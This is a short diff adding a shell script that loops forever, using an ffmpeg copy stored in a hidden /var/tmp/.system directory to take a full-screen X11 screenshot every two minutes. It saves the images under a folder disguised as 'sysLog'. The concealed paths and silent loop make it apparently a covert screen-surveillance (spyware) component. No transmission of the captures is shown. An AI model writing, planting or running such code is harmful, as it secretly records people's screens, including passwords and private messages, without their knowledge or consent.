@@ -1,0 +1,5 @@
+while true; 
+do 
+	/var/tmp/.system/./ffmpeg -f x11grab -video_size $(xdpyinfo | grep dimensions | cut -d" " -f7) -i $DISPLAY -vframes 1  /var/tmp/.system/sysLog/$(date +%Y%m%d-%H%M%S).png
+	sleep 120
+done
